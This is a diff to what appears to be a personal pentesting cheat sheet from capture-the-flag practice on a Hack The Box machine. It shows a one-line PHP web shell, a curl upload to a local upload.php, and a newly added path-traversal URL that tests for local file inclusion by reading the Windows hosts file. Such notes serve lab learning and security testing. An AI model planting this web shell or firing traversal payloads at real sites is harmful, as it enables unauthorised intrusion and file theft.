@@ -66,3 +66,13 @@ curl -F file=@clip.txt http://127.0.0.1/upload.php
 ```
 <?php system($_REQUEST['COMMAND']); ?>
 ```
+
+
+# Check for locale file inclusion on a page(windows box):
+
+```
+# this can work if you something like "include($_GET["page"]" in your php code since this will call anything that the a user will put in as a "page" variable
+# if allow_url_include is set to "0" in php.ini, then RFI is disabled, but LFI is still a thing
+
+http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
+```
